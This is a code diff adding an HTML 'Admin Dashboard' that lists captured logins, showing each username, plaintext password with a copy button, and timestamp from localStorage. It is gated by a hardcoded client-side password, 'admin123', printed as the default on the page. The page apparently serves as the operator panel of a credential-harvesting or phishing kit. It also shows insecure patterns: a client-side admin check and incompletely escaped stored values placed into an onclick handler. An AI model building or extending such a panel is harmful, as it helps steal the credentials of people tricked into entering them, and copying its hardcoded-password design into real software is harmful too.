@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background: #f0f2f5; min-height: 100vh; }
+        .login-screen { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #1a1a2e; }
+        .login-box { background: white; padding: 40px 35px; border-radius: 12px; width: 360px; max-width: 95%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+        .login-box h1 { text-align: center; font-size: 20px; margin-bottom: 5px; color: #1a1a2e; }
+        .login-box p { text-align: center; color: #888; font-size: 13px; margin-bottom: 25px; }
+        .login-box input { width: 100%; padding: 12px 14px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 14px; outline: none; margin-bottom: 15px; }
+        .login-box input:focus { border-color: #1a6b3c; }
+        .login-box button { width: 100%; padding: 12px; background: #1a1a2e; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .login-box button:hover { background: #16213e; }
+        .login-box .error-msg { color: #c62828; background: #ffebee; padding: 10px; border-radius: 6px; margin-bottom: 15px; text-align: center; font-size: 13px; }
+        .header { background: #1a1a2e; color: white; padding: 15px 25px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
+        .header h1 { font-size: 18px; }
+        .header button, .header a { background: rgba(255,255,255,0.15); color: white; border: none; padding: 7px 16px; border-radius: 5px; cursor: pointer; font-size: 13px; text-decoration: none; }
+        .header button:hover, .header a:hover { background: rgba(255,255,255,0.25); }
+        .container { max-width: 1000px; margin: 25px auto; padding: 0 20px; }
+        .stats { display: flex; gap: 15px; margin-bottom: 25px; flex-wrap: wrap; }
+        .stat-card { background: white; padding: 18px 22px; border-radius: 10px; flex: 1; min-width: 140px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .stat-card .num { font-size: 26px; font-weight: 800; color: #1a1a2e; }
+        .stat-card .lbl { color: #888; font-size: 12px; margin-top: 3px; }
+        .table-wrap { background: white; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); overflow-x: auto; }
+        table { width: 100%; border-collapse: collapse; }
+        th { background: #1a1a2e; color: white; padding: 12px 15px; font-size: 13px; text-align: start; }
+        td { padding: 11px 15px; border-bottom: 1px solid #eee; font-size: 14px; }
+        tr:hover { background: #f8f9ff; }
+        .pw { font-family: 'Courier New', monospace; background: #f5f5f5; padding: 2px 7px; border-radius: 3px; font-size: 13px; }
+        .cpy { background: none; border: 1px solid #ddd; border-radius: 3px; padding: 1px 7px; cursor: pointer; font-size: 11px; color: #666; margin-right: 4px; }
+        .cpy:hover { background: #eee; }
+        .empty-state { text-align: center; padding: 50px; color: #888; }
+        .empty-state .emoji { font-size: 44px; margin-bottom: 8px; }
+        .time-col { color: #999; font-size: 12px; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+<div id="loginScreen" class="login-screen">
+    <div class="login-box">
+        <h1>🔐 Admin</h1>
+        <p>Enter admin password</p>
+        <div id="loginError" class="error-msg hidden">Wrong password</div>
+        <input id="adminPass" type="password" placeholder="Admin password" autofocus>
+        <button onclick="checkPass()">Login</button>
+        <p style="text-align:center;margin-top:14px;font-size:12px;color:#aaa;">Default: admin123</p>
+    </div>
+</div>
+<div id="dashboard" class="hidden">
+    <div class="header">
+        <h1>⚙️ Admin Dashboard</h1>
+        <div>
+            <span id="totalCount" style="color:#aaa;font-size:13px;margin-right:10px;"></span>
+            <button onclick="clearAll()">🗑️ Clear All</button>
+            <a href="#" onclick="logout();return false;">🚪 Logout</a>
+        </div>
+    </div>
+    <div class="container">
+        <div class="stats">
+            <div class="stat-card"><div class="num" id="statTotal">0</div><div class="lbl">Total Logins</div></div>
+            <div class="stat-card"><div class="num" id="statToday">0</div><div class="lbl">Today</div></div>
+            <div class="stat-card"><div class="num" id="statUsers">0</div><div class="lbl">Unique Users</div></div>
+        </div>
+        <div class="table-wrap">
+            <div id="emptyState" class="empty-state"><div class="emoji">📭</div><p>No logins captured yet</p></div>
+            <table id="dataTable" class="hidden">
+                <thead><tr><th>#</th><th>Username</th><th>Password</th><th>Time</th></tr></thead>
+                <tbody id="tableBody"></tbody>
+            </table>
+        </div>
+    </div>
+</div>
+<script>
+var ADMIN_PASS = "admin123";
+function checkPass() { var p = document.getElementById("adminPass").value; if (p === ADMIN_PASS) { document.getElementById("loginScreen").classList.add("hidden"); document.getElementById("dashboard").classList.remove("hidden"); loadData(); } else { var err = document.getElementById("loginError"); err.classList.remove("hidden"); setTimeout(function() { err.classList.add("hidden"); }, 2000); } }
+document.getElementById("adminPass").addEventListener("keypress", function(e) { if (e.key === "Enter") checkPass(); });
+function loadData() { var data = JSON.parse(localStorage.getItem("myapp_logins") || "[]"); document.getElementById("statTotal").textContent = data.length; document.getElementById("totalCount").textContent = data.length + " logins"; var today = new Date().toDateString(), todayCount = 0; for (var i=0; i<data.length; i++) { if (data[i].time && data[i].time.indexOf(today) > -1) todayCount++; } document.getElementById("statToday").textContent = todayCount; var seen = {}, uniqueCount = 0; for (var i=0; i<data.length; i++) { if (data[i].username && !seen[data[i].username]) { seen[data[i].username] = true; uniqueCount++; } } document.getElementById("statUsers").textContent = uniqueCount; var tbody = document.getElementById("tableBody"); tbody.innerHTML = ""; var empty = document.getElementById("emptyState"); var table = document.getElementById("dataTable"); if (data.length === 0) { empty.classList.remove("hidden"); table.classList.add("hidden"); return; } empty.classList.add("hidden"); table.classList.remove("hidden"); for (var i = data.length - 1; i >= 0; i--) { var d = data[i]; var tr = document.createElement("tr"); var passSafe = (d.password || "").replace(/</g, "&lt;").replace(/>/g, "&gt;"); var userSafe = (d.username || "").replace(/</g, "&lt;").replace(/>/g, "&gt;"); tr.innerHTML = "<td>" + (i+1) + "</td><td><strong>" + userSafe + "</strong></td><td><span class=\"pw\">" + passSafe + "</span> <button class=\"cpy\" onclick='copyText(\"" + passSafe.replace(/'/g, "\\'") + "\")'>Copy</button></td><td class=\"time-col\">" + (d.time || "-") + "</td>"; tbody.appendChild(tr); } }
+function copyText(t) { var ta = document.createElement("textarea"); ta.value = t; document.body.appendChild(ta); ta.select(); document.execCommand("copy"); document.body.removeChild(ta); alert("Copied: " + t); }
+function clearAll() { if (!confirm("Delete all records?")) return; localStorage.setItem("myapp_logins", "[]"); loadData(); }
+function logout() { document.getElementById("dashboard").classList.add("hidden"); document.getElementById("loginScreen").classList.remove("hidden"); document.getElementById("adminPass").value = ""; }
+</script>
+</body>
+</html>
